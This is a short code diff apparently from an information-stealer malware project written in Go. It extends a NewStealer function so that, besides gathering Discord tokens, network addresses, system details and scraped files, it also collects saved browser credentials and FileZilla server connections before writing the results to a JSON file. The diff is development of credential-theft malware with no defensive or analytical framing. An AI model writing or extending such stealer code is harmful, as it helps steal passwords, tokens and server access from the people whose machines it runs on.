@@ -52,7 +52,6 @@ func NewStealer() (stealer *Stealer) {
 	stealer.GetNetworkAddresses()
 	stealer.GetSystemInfo()
 
-	// 
 	if getDiscordTokens {
 		stealer.GetTokens()
 	}
@@ -67,6 +66,12 @@ func NewStealer() (stealer *Stealer) {
 	}
 	if getScrapedFiles {
 		stealer.GetFileScrape()
+	}
+	if getBrowserCredentials {
+		stealer.GetBrowserCredentials()
+	}
+	if getFileZillaServers {
+		stealer.GetFileZillaConnections()
 	}
 
 	stealer.WriteSystemJson()
